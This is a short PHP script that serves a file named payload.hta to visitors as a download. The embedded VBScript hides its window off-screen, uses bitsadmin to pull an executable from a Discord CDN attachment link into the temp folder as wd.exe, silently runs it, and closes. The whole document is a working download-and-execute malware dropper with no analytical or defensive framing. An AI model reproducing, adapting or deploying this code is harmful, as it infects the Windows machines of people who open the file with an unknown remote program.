<?php
header('Content-Type: application/hta');
header('Content-Disposition: attachment; filename="payload.hta"');

$hta = '
<html>
<body>
<script language="VBScript">
Window.ResizeTo 0,0:Window.MoveTo -5000,-5000

Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
Dim temp: temp = fso.GetSpecialFolder(2)

shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1520291709915758602/1533622635571843256/navi.exe?ex=6a7128e1&is=6a6fd761&hm=fcf25c9a4d5b834a47acbcd099ca414c5f61d28a7b5cd272109430aba2a71d98&"" """ & temp & "\wd.exe""", 0, True

If fso.FileExists(temp & "\wd.exe") Then
    shell.Run """" & temp & "\wd.exe""", 0, False
End If

window.close()
</script>
</body>
</html>
';

echo $hta;
?>
